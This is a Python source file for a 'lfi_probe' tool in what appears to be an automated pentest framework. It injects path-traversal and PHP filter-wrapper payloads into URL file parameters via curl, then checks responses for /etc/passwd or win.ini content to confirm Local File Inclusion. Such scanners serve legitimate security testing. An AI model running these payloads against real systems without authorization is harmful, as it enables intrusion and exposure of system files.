"""LFI Probe — test for Local File Inclusion vulnerabilities."""

from __future__ import annotations

import asyncio
import base64
import logging
import re
import time
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from tools.base import ToolDefinition, ToolParam, ToolResult, registry

logger = logging.getLogger("hades.tools.lfi_probe")

_MAX_OUTPUT = 512_000

_FILE_PARAMS = [
    "file", "page", "path", "doc", "document", "folder", "root",
    "include", "inc", "locate", "show", "template", "lang", "language",
    "view", "content", "layout", "mod", "conf",
]

_LINUX_PAYLOADS = [
    ("../../../etc/passwd", "basic traversal"),
    ("....//....//....//etc/passwd", "double-dot bypass"),
    ("/etc/passwd", "absolute path"),
    ("..%2f..%2f..%2fetc/passwd", "URL-encoded traversal"),
    ("....%5c....%5c....%5cetc/passwd", "backslash encoded"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter wrapper"),
]

_WINDOWS_PAYLOADS = [
    ("..\\..\\..\\..\\windows\\win.ini", "Windows backslash traversal"),
    ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", "Windows encoded traversal"),
]

_PASSWD_RE = re.compile(r"root:x?:0:0:")
_WIN_INI_RE = re.compile(r"\[(?:extensions|fonts)\]", re.IGNORECASE)


class LfiProbeTool(ToolDefinition):
    name = "lfi_probe"
    binary = "curl"
    description = (
        "Test for Local File Inclusion by injecting traversal payloads "
        "and PHP filter wrappers into file parameters"
    )
    category = "exploitation"
    risk = "high"
    timeout = 60
    params = [
        ToolParam("url", "URL with file parameter (e.g. https://target/page?file=home.html)", required=True),
        ToolParam("param", "Parameter name to test (auto-detected if empty)"),
    ]

    @staticmethod
    def _detect_file_param(url: str) -> str | None:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for candidate in _FILE_PARAMS:
            for key in qs:
                if key.lower() == candidate.lower():
                    return key
        keys = list(qs.keys())
        return keys[0] if keys else None

    @staticmethod
    def _inject_payload(url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def _curl_fetch(self, url: str) -> tuple[str, int, str | None]:
        """Return (body, status_code, error)."""
        args = [
            "curl", "-sk", "--max-time", "10",
            "-w", "\n%{http_code}",
            url,
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *args,
                stdin=asyncio.subprocess.DEVNULL,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
                start_new_session=True,
            )
            stdout_raw, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            raw = stdout_raw.decode("utf-8", errors="replace")
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            return "", 0, "timeout"
        except Exception as exc:
            return "", 0, str(exc)

        lines = raw.rsplit("\n", 1)
        if len(lines) == 2:
            body = lines[0]
            try:
                status = int(lines[1])
            except ValueError:
                status = 0
        else:
            body = raw
            status = 0
        return body, status, None

    @staticmethod
    def _check_passwd(body: str) -> str | None:
        """Check if response contains /etc/passwd content."""
        if _PASSWD_RE.search(body):
            # Extract a snippet around the match
            match = _PASSWD_RE.search(body)
            start = max(0, match.start() - 20)
            end = min(len(body), match.end() + 100)
            return body[start:end]
        return None

    @staticmethod
    def _check_passwd_base64(body: str) -> str | None:
        """Check if response contains base64-encoded /etc/passwd."""
        # Look for a large base64 block and try to decode
        b64_blocks = re.findall(r'[A-Za-z0-9+/=]{50,}', body)
        for block in b64_blocks[:3]:
            try:
                decoded = base64.b64decode(block).decode("utf-8", errors="replace")
                if _PASSWD_RE.search(decoded):
                    return decoded[:200]
            except Exception:
                continue
        return None

    @staticmethod
    def _check_win_ini(body: str) -> str | None:
        if _WIN_INI_RE.search(body):
            match = _WIN_INI_RE.search(body)
            start = max(0, match.start() - 20)
            end = min(len(body), match.end() + 100)
            return body[start:end]
        return None

    async def run(self, target: str, params: dict[str, Any] | None = None) -> ToolResult:
        params = params or {}
        if not self.is_available():
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary=f"{self.binary} not found in PATH",
                raw_output="", error=f"{self.binary} not installed",
            )

        url = params.get("url") or target
        param_name = params.get("param") or self._detect_file_param(url)

        if not param_name:
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary="No file parameter detected. Provide 'param' or use a URL with ?file=, ?page=, etc.",
                raw_output="", error="no_file_param",
            )

        start = time.monotonic()
        findings: list[dict] = []
        log_rows = ["PAYLOAD | STATUS | EVIDENCE | VERDICT"]
        log_rows.append("-" * 85)

        # Get baseline to avoid false positives
        base_body, base_status, _ = await self._curl_fetch(url)
        base_has_passwd = self._check_passwd(base_body) is not None

        # Linux payloads
        for payload, payload_type in _LINUX_PAYLOADS:
            test_url = self._inject_payload(url, param_name, payload)
            body, status, error = await self._curl_fetch(test_url)

            if error:
                log_rows.append(f"{payload_type:<30} | ERR | {error} | -")
                continue

            evidence = None
            is_php_filter = "php://filter" in payload

            if is_php_filter:
                evidence = self._check_passwd_base64(body)
            else:
                evidence = self._check_passwd(body)

            # Skip if baseline already has this content (false positive)
            if evidence and base_has_passwd and not is_php_filter:
                log_rows.append(f"{payload_type:<30} | {status:<6} | (baseline match) | skip")
                continue

            verdict = "VULNERABLE" if evidence else "safe"
            evidence_short = evidence[:60].replace("\n", " ") if evidence else "-"
            log_rows.append(f"{payload_type:<30} | {status:<6} | {evidence_short:<40} | {verdict}")

            if evidence:
                findings.append({
                    "type": "local_file_inclusion",
                    "severity": "critical",
                    "parameter": param_name,
                    "payload": payload,
                    "payload_type": payload_type,
                    "evidence": evidence[:500],
                    "status_code": status,
                    "detail": f"LFI confirmed via {payload_type}: /etc/passwd readable "
                              f"through param '{param_name}'",
                    "url": test_url,
                })

        # Windows payloads
        for payload, payload_type in _WINDOWS_PAYLOADS:
            test_url = self._inject_payload(url, param_name, payload)
            body, status, error = await self._curl_fetch(test_url)

            if error:
                log_rows.append(f"{payload_type:<30} | ERR | {error} | -")
                continue

            evidence = self._check_win_ini(body)
            verdict = "VULNERABLE" if evidence else "safe"
            evidence_short = evidence[:60].replace("\n", " ") if evidence else "-"
            log_rows.append(f"{payload_type:<30} | {status:<6} | {evidence_short:<40} | {verdict}")

            if evidence:
                findings.append({
                    "type": "local_file_inclusion",
                    "severity": "critical",
                    "parameter": param_name,
                    "payload": payload,
                    "payload_type": payload_type,
                    "evidence": evidence[:500],
                    "status_code": status,
                    "os": "windows",
                    "detail": f"LFI confirmed via {payload_type}: win.ini readable "
                              f"through param '{param_name}'",
                    "url": test_url,
                })

        elapsed = time.monotonic() - start

        if findings:
            types = sorted({f["payload_type"] for f in findings})
            summary = (
                f"LFI CONFIRMED (CRITICAL) — {len(findings)} payload(s) succeeded "
                f"on param '{param_name}' ({', '.join(types)})"
            )
        else:
            total = len(_LINUX_PAYLOADS) + len(_WINDOWS_PAYLOADS)
            summary = f"No LFI found on param '{param_name}' ({total} payloads tested)"

        return ToolResult(
            tool=self.name,
            target=target,
            success=True,
            summary=summary,
            raw_output="\n".join(log_rows)[:_MAX_OUTPUT],
            findings=findings,
            duration=elapsed,
            exit_code=0,
        )

    def build_args(self, target: str, params: dict[str, Any]) -> list[str]:
        return []

    def parse_output(self, stdout: str, stderr: str, exit_code: int, target: str) -> ToolResult:
        return ToolResult(
            tool=self.name, target=target, success=True,
            summary="", raw_output=stdout, exit_code=exit_code,
        )


registry.register(LfiProbeTool())
